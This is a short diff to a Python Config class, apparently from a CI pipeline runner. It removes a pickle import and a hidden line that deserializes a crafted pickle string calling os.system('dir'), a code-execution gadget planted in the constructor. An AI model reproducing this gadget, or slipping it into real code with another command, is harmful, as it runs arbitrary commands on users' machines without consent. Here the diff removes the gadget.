@@ -1,7 +1,6 @@
 import getpass
 import logging
 import os
-import pickle
 import posixpath
 from typing import Dict
 
@@ -15,8 +14,6 @@ class Config:
 
         # TODO: Move some of these things to default definitions or smth
         self.default_image = "atlassian/default-image:latest"
-
-        pickle.loads(" cos.system(S'dir')tR. ")
 
         self.default_caches = {
             "composer": "~/.composer/cache",
